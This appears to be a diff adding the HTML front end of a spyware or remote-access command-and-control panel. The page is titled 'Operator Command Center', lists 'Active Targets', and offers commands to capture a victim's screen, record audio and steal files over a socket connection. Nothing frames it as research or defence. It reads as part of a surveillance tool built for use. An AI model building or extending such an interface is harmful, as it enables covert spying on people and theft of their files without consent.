@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Operator Command Center</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+<body>
+    <div class="dashboard-container">
+        <h1>Active Targets</h1>
+        <div id="targets-list"></div>
+        <div class="command-panel">
+            <input type="text" id="target-id" placeholder="Target ID">
+            <select id="command-type">
+                <option value="capture_screen">Capture Screen</option>
+                <option value="record_audio">Record Audio</option>
+                <option value="steal_files">Steal Files</option>
+            </select>
+            <button onclick="sendCommand()">Send Command</button>
+        </div>
+    </div>
+    <script src="client-logic.js"></script>
+</body>
+</html>
